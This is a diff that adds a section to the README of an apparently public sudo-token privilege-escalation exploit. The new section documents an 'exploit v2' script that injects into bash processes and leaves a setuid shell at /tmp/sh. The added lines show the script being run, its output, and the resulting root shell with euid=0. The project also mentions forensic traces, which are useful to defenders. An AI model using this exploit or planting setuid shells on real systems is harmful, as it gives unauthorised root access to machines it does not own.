@@ -56,6 +56,23 @@ Start two terminals:
 
 ## Going further
 
+### exploit v2 creates a suid sh in /tmp/sh
+
+For those with less luck with exploit v1 try the v2
+
+```sh
+$ ./exploit_v2.sh
+Current process : 2441
+chmod: changing permissions of 'activate_sudo_token': Operation not permitted
+Injecting process 1721 -> bash
+Injecting process 2433 -> bash
+cat: /proc/2446/comm: No such file or directory
+Injecting process 2446 -> 
+$ /tmp/sh -p
+# id
+uid=1001(test) gid=1001(test) euid=0(root) egid=0(root) groups=0(root),1001(test)
+```
+
 ### Forensic, DFIR?
 
 Printing to be improved but each process sudo attempt has one entry in /var/run/sudo/ts/[username].
